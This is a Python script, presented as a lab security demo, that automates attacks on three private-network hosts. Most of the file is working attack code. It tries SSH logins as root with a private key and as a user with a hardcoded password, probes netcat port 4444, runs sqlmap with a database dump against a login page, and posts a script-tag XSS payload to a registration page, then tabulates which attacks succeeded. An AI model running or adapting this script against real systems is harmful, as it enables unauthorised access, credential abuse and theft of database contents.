#!/usr/bin/env python3
"""
Security Demo - Multi-Host Attack Automation Script
For use in controlled lab environments only.
"""

import subprocess
import socket
import requests
import paramiko
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ──────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────

HOSTS = [
    "192.168.20.13",
    "192.168.20.14",
    "192.168.20.15",
]

SSH_ROOT_USER = "root"
SSH_ROOT_KEY  = "/root/.ssh/id_rsa"   # path to your private key, or set to None

SSH_USER      = "user"
SSH_PASSWORD  = "password123"

NETCAT_PORT   = 4444
NETCAT_TIMEOUT = 5   # seconds

SQLMAP_DB     = "testdb"
SQLMAP_DATA   = "email=test&password=test"
LOGIN_PATH    = "/login.php"
REGISTER_PATH = "/register.php"

XSS_PAYLOAD   = "<script>alert(1)</script>"
XSS_FIELDS    = {"username": XSS_PAYLOAD, "email": "xss@test.com", "password": "test123"}

PARALLEL      = True   # set False to run hosts sequentially

# ──────────────────────────────────────────────
# INDIVIDUAL ATTACK FUNCTIONS
# ──────────────────────────────────────────────

def attack_ping(host):
    """ICMP ping via system ping command."""
    try:
        result = subprocess.run(
            ["ping", "-c", "2", "-W", "2", host],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return True, "Host is up"
        return False, "No ping response"
    except Exception as e:
        return False, str(e)


def attack_ssh_root(host):
    """SSH as root using key-based auth."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        connect_kwargs = dict(hostname=host, username=SSH_ROOT_USER, timeout=10)
        if SSH_ROOT_KEY:
            connect_kwargs["key_filename"] = SSH_ROOT_KEY
        client.connect(**connect_kwargs)
        stdin, stdout, stderr = client.exec_command("id")
        output = stdout.read().decode().strip()
        client.close()
        return True, f"Logged in as root — {output}"
    except paramiko.AuthenticationException:
        return False, "Authentication failed"
    except Exception as e:
        return False, str(e)


def attack_ssh_user(host):
    """SSH as user with password auth."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=SSH_USER, password=SSH_PASSWORD,
                       timeout=10, look_for_keys=False)
        stdin, stdout, stderr = client.exec_command("id")
        output = stdout.read().decode().strip()
        client.close()
        return True, f"Logged in as {SSH_USER} — {output}"
    except paramiko.AuthenticationException:
        return False, "Authentication failed"
    except Exception as e:
        return False, str(e)


def attack_netcat(host):
    """Check if netcat listener is open on NETCAT_PORT."""
    try:
        with socket.create_connection((host, NETCAT_PORT), timeout=NETCAT_TIMEOUT) as s:
            s.sendall(b"HELLO\n")
            data = s.recv(1024)
            return True, f"Port {NETCAT_PORT} open — received {len(data)} bytes"
    except ConnectionRefusedError:
        return False, f"Port {NETCAT_PORT} refused"
    except socket.timeout:
        return False, f"Port {NETCAT_PORT} timed out"
    except Exception as e:
        return False, str(e)


def attack_sqlmap(host):
    """Run sqlmap and check for successful dump."""
    url = f"http://{host}{LOGIN_PATH}"
    cmd = [
        "sqlmap",
        "-u", url,
        "--data", SQLMAP_DATA,
        "-D", SQLMAP_DB,
        "--dump",
        "--flush-session",
        "--batch",           # non-interactive
        "--output-dir", f"/tmp/sqlmap_{host.replace('.', '_')}",
        "--level", "1",
        "--risk", "1",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        combined = result.stdout + result.stderr
        if "dumped to CSV" in combined or "entries" in combined:
            # Try to pull a snippet of dumped data
            lines = [l for l in combined.splitlines() if "|" in l][:4]
            snippet = " | ".join(lines) if lines else "Data dumped (see output dir)"
            return True, snippet
        elif "not injectable" in combined.lower():
            return False, "Not injectable"
        elif "ERROR" in combined:
            return False, "sqlmap error — is the target up?"
        else:
            return False, "No dump achieved"
    except FileNotFoundError:
        return False, "sqlmap not found in PATH"
    except subprocess.TimeoutExpired:
        return False, "sqlmap timed out (120s)"
    except Exception as e:
        return False, str(e)


def attack_xss(host):
    """POST XSS payload to register.php and check if it reflects."""
    url = f"http://{host}{REGISTER_PATH}"
    try:
        resp = requests.post(url, data=XSS_FIELDS, timeout=10, allow_redirects=True)
        if XSS_PAYLOAD in resp.text:
            return True, f"Payload reflected in response (HTTP {resp.status_code})"
        elif resp.status_code in (200, 201, 302):
            return False, f"Request accepted (HTTP {resp.status_code}) but payload not reflected"
        else:
            return False, f"HTTP {resp.status_code}"
    except requests.ConnectionError:
        return False, "Connection refused"
    except requests.Timeout:
        return False, "Request timed out"
    except Exception as e:
        return False, str(e)


# ──────────────────────────────────────────────
# PER-HOST RUNNER
# ──────────────────────────────────────────────

ATTACKS = [
    ("Ping",        attack_ping),
    ("SSH Root",    attack_ssh_root),
    ("SSH User",    attack_ssh_user),
    ("Netcat",      attack_netcat),
    ("SQLMap",      attack_sqlmap),
    ("XSS",         attack_xss),
]

def run_against_host(host):
    results = {}
    for name, fn in ATTACKS:
        # Skip all further attacks if ping failed
        if name != "Ping" and not results.get("Ping", {}).get("success", False):
            results[name] = {"success": False, "detail": "Skipped (host unreachable)"}
            continue
        success, detail = fn(host)
        results[name] = {"success": success, "detail": detail}
    return host, results


# ──────────────────────────────────────────────
# DISPLAY
# ──────────────────────────────────────────────

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"
CYAN   = "\033[96m"

def print_results(all_results):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = 72

    print(f"\n{BOLD}{CYAN}{'═' * width}{RESET}")
    print(f"{BOLD}{CYAN}  ATTACK DEMO RESULTS — {timestamp}{RESET}")
    print(f"{BOLD}{CYAN}{'═' * width}{RESET}\n")

    attack_names = [a[0] for a in ATTACKS]

    # Per-host detail
    for host, results in sorted(all_results.items()):
        ping_ok = results.get("Ping", {}).get("success", False)
        host_status = f"{GREEN}UP{RESET}" if ping_ok else f"{RED}DOWN{RESET}"
        print(f"  {BOLD}HOST: {host}{RESET}  [{host_status}]")
        print(f"  {'─' * (width - 4)}")
        for name in attack_names:
            r = results.get(name, {})
            ok     = r.get("success", False)
            detail = r.get("detail", "—")
            icon   = f"{GREEN}✔  PASS{RESET}" if ok else f"{RED}✘  FAIL{RESET}"
            print(f"    {name:<12} {icon}   {detail}")
        print()

    # Summary table
    print(f"{BOLD}{CYAN}{'═' * width}{RESET}")
    print(f"{BOLD}  SUMMARY TABLE{RESET}")
    print(f"{BOLD}{CYAN}{'═' * width}{RESET}")

    col_w = 10
    header = f"  {'HOST':<17}" + "".join(f"{n:<{col_w}}" for n in attack_names)
    print(f"{BOLD}{header}{RESET}")
    print(f"  {'─' * (width - 2)}")

    for host, results in sorted(all_results.items()):
        row = f"  {host:<17}"
        for name in attack_names:
            ok = results.get(name, {}).get("success", False)
            cell = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
            # pad around the color codes
            row += f"{cell:<{col_w + 9}}"
        print(row)

    # Overall stats
    print(f"\n{BOLD}  STATISTICS{RESET}")
    total_hosts = len(all_results)
    for name in attack_names:
        passed = sum(1 for r in all_results.values() if r.get(name, {}).get("success"))
        bar = f"{GREEN}{'█' * passed}{RED}{'░' * (total_hosts - passed)}{RESET}"
        print(f"    {name:<12} {bar}  {passed}/{total_hosts} hosts")

    print(f"\n{BOLD}{CYAN}{'═' * width}{RESET}\n")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    print(f"{BOLD}{YELLOW}[*] Starting attack demo against {len(HOSTS)} host(s)...{RESET}")
    print(f"{YELLOW}    Attacks: {', '.join(a[0] for a in ATTACKS)}{RESET}\n")

    all_results = {}

    if PARALLEL:
        with ThreadPoolExecutor(max_workers=len(HOSTS)) as pool:
            futures = {pool.submit(run_against_host, h): h for h in HOSTS}
            for future in as_completed(futures):
                host, results = future.result()
                all_results[host] = results
                ping = results.get("Ping", {}).get("success", False)
                status = f"{GREEN}up{RESET}" if ping else f"{RED}down{RESET}"
                print(f"  {YELLOW}[+]{RESET} Finished {host} ({status})")
    else:
        for host in HOSTS:
            print(f"  {YELLOW}[+]{RESET} Running against {host}...")
            host, results = run_against_host(host)
            all_results[host] = results

    print_results(all_results)

    # Optionally save JSON report
    report_path = f"/tmp/demo_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    clean = {h: {k: v for k, v in r.items()} for h, r in all_results.items()}
    with open(report_path, "w") as f:
        json.dump(clean, f, indent=2)
    print(f"{YELLOW}[*] JSON report saved to {report_path}{RESET}\n")


if __name__ == "__main__":
    main()
